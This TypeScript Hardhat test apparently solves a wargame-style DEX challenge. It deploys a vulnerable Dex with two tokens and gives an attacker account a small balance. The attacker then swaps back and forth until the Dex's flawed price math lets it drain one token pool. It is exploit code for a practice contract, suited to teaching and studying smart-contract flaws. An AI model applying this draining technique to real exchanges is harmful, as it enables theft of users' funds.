import { expect } from "chai";
import { BigNumber } from "ethers";
import { parseEther } from "ethers/lib/utils";
import { ethers } from "hardhat";

describe("Greeter", function () {
  it("Should go to zero", async function () {
    const [owner, attacker] = await ethers.getSigners()

    // deploy dex
    const Dex = await ethers.getContractFactory("Dex");
    const dex = await Dex.connect(owner).deploy();
    await dex.deployed();


    // deploy first token
    const FirstToken = await ethers.getContractFactory("SwappableToken")
    const firstToken = await FirstToken.connect(owner).deploy(dex.address, "First Token", "FT", 110)
    await firstToken.deployed()

    // deploy second token
    const SecondToken = await ethers.getContractFactory("SwappableToken")
    const secondToken = await SecondToken.connect(owner).deploy(dex.address, "Second Token", "ST", 110)
    await secondToken.deployed()

    // set tokens
    const setTokensTx = await dex.setTokens(firstToken.address, secondToken.address)
    await setTokensTx.wait(1)

    // add liquidity
    const firstTokenLiquidity = await firstToken.connect(owner).transfer(dex.address, 100)
    firstTokenLiquidity.wait(1)
    const secondTokenLiquidity = await secondToken.connect(owner).transfer(dex.address, 100)
    secondTokenLiquidity.wait(1)

    // add initial balance to attacker
    const firstTokenInitialBalance = await firstToken.connect(owner).transfer(attacker.address, 10)
    firstTokenInitialBalance.wait(1)
    const secondTokenInitialBalance = await secondToken.connect(owner).transfer(attacker.address, 10)
    secondTokenInitialBalance.wait(1)

    // check if dex balance is 100 / 100
    expect(
      await dex.balanceOf(firstToken.address, dex.address)
    ).to.equal(BigNumber.from(100))
    expect(
      await dex.balanceOf(secondToken.address, dex.address)
    ).to.equal(BigNumber.from(100))

    // check if attacker balance 10 / 10
    expect(
      await dex.balanceOf(firstToken.address, attacker.address)
    ).to.equal(BigNumber.from(10))
    expect(
      await dex.balanceOf(secondToken.address, attacker.address)
    ).to.equal(BigNumber.from(10))

    const checkBalance = async (address: string): Promise<BigNumber[]> => {
      const firstTokenBalance = await firstToken.balanceOf(address)
      const secondTokenBalance = await secondToken.balanceOf(address)
      console.log(firstTokenBalance, secondTokenBalance)
      return [firstTokenBalance, secondTokenBalance]
    }

    // approve very large number
    const tokenApproval = await dex.connect(attacker).approve(dex.address, parseEther("1"))
    await tokenApproval.wait(1)

    for (let i = 0; i < 5; i++) {
      if (i % 2 == 0) {
        const swap = await dex.connect(attacker).swap(firstToken.address, secondToken.address, (await checkBalance(attacker.address))[0])
        await swap.wait(1)
      } else {
        const swap = await dex.connect(attacker).swap(secondToken.address, firstToken.address, (await checkBalance(attacker.address))[1])
        await swap.wait(1)
      }
    }
    // swap the leftover
    const swap = await dex.connect(attacker).swap(secondToken.address, firstToken.address, (await checkBalance(dex.address))[1])
    await swap.wait(1)

    console.log("\n")
    await checkBalance(attacker.address)
    await checkBalance(dex.address)

    // // swap a -> b
    // const firstSwap = await dex.connect(attacker).swap(firstToken.address, secondToken.address, (await checkAttackerBalance())[0])
    // await firstSwap.wait(1)

    // // swap b -> a
    // const secondSwap = await dex.connect(attacker).swap(secondToken.address, firstToken.address, (await checkAttackerBalance())[1])
    // await secondSwap.wait(1)

    // // swap a -> b
    // const thirdSwap = await dex.connect(attacker).swap(firstToken.address, secondToken.address, (await checkAttackerBalance())[0])
    // await thirdSwap.wait(1)

    // // swap b -> a
    // const fourthSwap = await dex.connect(attacker).swap(secondToken.address, firstToken.address, (await checkAttackerBalance())[1])
    // await fourthSwap.wait(1)

  });




});
